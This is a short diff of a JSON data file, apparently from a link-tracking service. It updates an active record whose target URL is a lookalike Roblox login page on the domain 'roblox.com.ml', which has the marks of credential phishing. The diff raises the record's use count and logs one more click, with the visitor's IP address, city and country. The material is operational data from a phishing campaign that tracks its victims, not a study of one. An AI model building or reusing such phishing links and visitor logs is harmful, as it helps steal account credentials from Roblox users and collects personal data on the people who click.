@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 246,
+    "useCount": 247,
     "createdBy": "admin",
     "clicks": [
       {
@@ -2080,6 +2080,14 @@
         "city": "San Pablo",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1776992850651,
+        "ip": "69.130.7.141",
+        "country": "United States",
+        "city": "Waterford",
+        "flag": "🇺🇸",
+        "countryCode": "US"
       }
     ]
   },
